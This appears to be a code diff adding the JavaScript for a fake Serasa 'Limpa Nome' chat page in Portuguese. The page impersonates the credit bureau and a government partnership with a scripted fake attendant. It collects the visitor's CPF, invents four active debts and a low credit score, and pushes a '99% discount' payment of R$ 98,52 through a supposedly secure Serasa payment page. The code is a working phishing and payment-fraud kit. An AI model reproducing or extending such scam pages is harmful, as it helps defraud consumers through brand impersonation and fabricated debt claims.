+        <strong>RESUMO DO SEU ACORDO:</strong><br><br>
+        • Contrato: 83N2L618362E<br>
+        • Beneficiário: CPF<br>
+        • Quitação: Todas as 4 dívidas<br>
+        • Valor final: R$ 98,52<br>
+        • Desconto: 99%
+      </div>`,
+    buttons: [
+      { text: 'REALIZAR PAGAMENTO DO ACORDO', next: 27, type: 'primary' }
+    ]
+  },
+  {
+    id: 27,
+    type: 'system',
+    content: 'Áudio final',
+    media: `<div class="message-media">
+      <audio controls class="media-audio">
+        <source src="${mediaUrls.audio5}" type="audio/mpeg">
+        Seu navegador não suporta áudio.
+      </audio>
+    </div>`,
+    autoNext: true
+  },
+  {
+    id: 28,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Para finalizar e limpar seu nome imediatamente, clique abaixo:',
+    subtext: 'Você será redirecionado para uma página de pagamento 100% segura do Serasa.',
+    buttons: [
+      { text: 'PAGAR E LIMPAR MEU NOME AGORA', next: 29, type: 'success' }
+    ]
+  },
+  {
+    id: 29,
+    type: 'system',
+    content: 'Redirecionando para página segura de pagamento...',
+    isFinal: true
+  }
+];
+
+let currentStep = 0;
+let cpfFromURLProcessed = false;
+
+// Processar cada passo do fluxo - AQUI É ONDE ADICIONAMOS O CPF DINAMICAMENTE
+async function processStep(stepId) {
+  const step = flow.find(s => s.id === stepId);
+  if (!step) return;
+  
+  currentStep = stepId;
+  
+  // Limpa indicadores de digitação anteriores
+  document.querySelectorAll('.typing-indicator').forEach(el => el.remove());
+  
+  if (step.type === 'system') {
+    // Mostra indicador de digitação antes da mensagem do sistema
+    const typingIndicator = showTypingIndicator('Sistema');
+    await new Promise(resolve => setTimeout(resolve, 800));
+    typingIndicator.remove();
+    
+    let content = step.content;
+    let media = step.media || '';
+    
+    // PASSO 5: Adiciona CPF se tiver
+    if (stepId === 5 && userCPF) {
+      content = `CPF ${maskCPF(userCPF)} validado com sucesso!`;
+    }
+    
+    addMessage(content, 'system', '', media);
+    
+    if (step.autoNext && !step.isFinal) {
+      setTimeout(() => processStep(stepId + 1), 1500);
+    } else if (step.buttons) {
+      setTimeout(() => showButtons(step.buttons), 500);
+    } else if (step.action === 'input_cpf') {
+      setTimeout(() => showCPFInput(), 500);
+    }
+    
+  } else if (step.type === 'bot' || step.type === 'atendente') {
+    // Mostra indicador de digitação
+    const typingIndicator = showTypingIndicator(step.sender);
+    await new Promise(resolve => setTimeout(resolve, 800));
+    typingIndicator.remove();
+    
+    let content = step.content;
+    let subtext = step.subtext || '';
+    let media = step.media || '';
+    
+    // PASSO 7: Mostra o CPF na confirmação
+    if (stepId === 7 && userCPF) {
+      subtext = `<div class="highlight-box">
+          <strong>CPF informado:</strong>
+          <div class="masked-data">${maskCPF(userCPF)}</div>
+          <p style="margin-top: 6px; font-size: 0.85rem;">Estas informações estão corretas?</p>
+        </div>`;
+    }
+    
+    // PASSO 12: Saudação personalizada
+    if (stepId === 12 && userCPF) {
+      content = `Perfeito, ${maskCPF(userCPF)}!`;
+    }
+    
+    // PASSO 19: Situação do CPF
+    if (stepId === 19 && userCPF) {
+      content = `Situação do CPF ${maskCPF(userCPF)}:`;
+      subtext = `Identificamos 4 dívidas ativas no sistema do CPF ${maskCPF(userCPF)}.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`;
+    }
+    
+    // PASSO 23: Oferta exclusiva
+    if (stepId === 23 && userCPF) {
+      subtext = `<div class="success-box">
+          <strong>OFERTA EXCLUSIVA para ${maskCPF(userCPF)}:</strong><br><br>
+          • 99% DE DESCONTO<br>
+          • Quitação de TODAS as 4 dívidas<br>
+          • Aumento para 890 pontos no score<br>
+          • Limpeza imediata do nome<br><br>
+          <strong style="font-size: 1rem;">VALOR TOTAL: R$ 98,52</strong>
+        </div>`;
+    }
+    
+    // PASSO 26: Parabéns com CPF
+    if (stepId === 26 && userCPF) {
+      content = `PARABÉNS, portador do CPF ${maskCPF(userCPF)}!`;
+      subtext = `<div class="success-box">
+          <strong>RESUMO DO SEU ACORDO:</strong><br><br>
+          • Contrato: 83N2L618362E<br>
+          • Beneficiário: CPF ${maskCPF(userCPF)}<br>
+          • Quitação: Todas as 4 dívidas<br>
+          • Valor final: R$ 98,52<br>
+          • Desconto: 99%
+        </div>`;
+    }
+    
+    // Criar mensagem completa
+    const messagesContainer = document.getElementById('messages');
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message ${step.type}-message`;
+    
+    const isAtendente = step.type === 'atendente';
+    const header = `
+      <div class="message-header">
+        <div class="message-avatar ${isAtendente ? 'atendente-avatar' : 'bot-avatar'}">
+          ${isAtendente ? 
+            '<img src="https://i.pravatar.cc/150?img=32" class="avatar-img" alt="Atendente">' : 
+            '<i class="fas fa-robot"></i>'}
+        </div>
+        <span>${step.sender}</span>
+      </div>
+    `;
+    
+    const timestamp = new Date().toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
+    
+    messageDiv.innerHTML = `
+      ${header}
+      <div class="message-content">${content}</div>
+      ${subtext ? `<div class="message-subcontent">${subtext}</div>` : ''}
+      ${media}
+      <div class="message-time">${timestamp}</div>
+    `;
+    
+    messagesContainer.appendChild(messageDiv);
+    scrollToBottom();
+    
+    if (step.buttons) {
+      setTimeout(() => showButtons(step.buttons), 500);
+    } else if (step.action === 'input_cpf') {
+      setTimeout(() => showCPFInput(), 300);
+    } else if (step.autoNext || step.delay) {
+      setTimeout(() => processStep(stepId + 1), 1500);
+    }
+  }
+  
+  if (step.isFinal) {
+    setTimeout(() => {
+      addMessage('Obrigado por escolher o Serasa Limpa Nome!', 'system');
+    }, 1500);
+  }
+}
+
+// Função para iniciar o fluxo baseado no CPF da URL
+function startFlowBasedOnCPF() {
+  if (urlCPF && isValidCPF(urlCPF) && !cpfFromURLProcessed) {
+    cpfFromURLProcessed = true;
+    console.log('CPF da URL detectado, validando...');
+    
+    setTimeout(() => {
+      addMessage('Bem-vindo ao canal oficial Serasa Limpa Nome!', 'bot', 'Bot Serasa', `
+        <div class="logos-container">
+          <img src="${mediaUrls.logoGovSer}" alt="GovernoSerasa" class="logo-img">
+        </div>
+      `);
+      
+      setTimeout(() => {
+        addMessage('Feirão Serasa Limpa Nome - Programa oficial sem fraudes', 'bot', 'Bot Serasa');
+        
+        setTimeout(() => {
+          validateCPF(urlCPF);
+        }, 1500);
+      }, 1500);
+    }, 800);
+    
+  } else {
+    setTimeout(() => processStep(1), 800);
+  }
+}
+
+// Inicializar chat
+setTimeout(() => startFlowBasedOnCPF(), 500);
 </script>
 </body>
 </html>
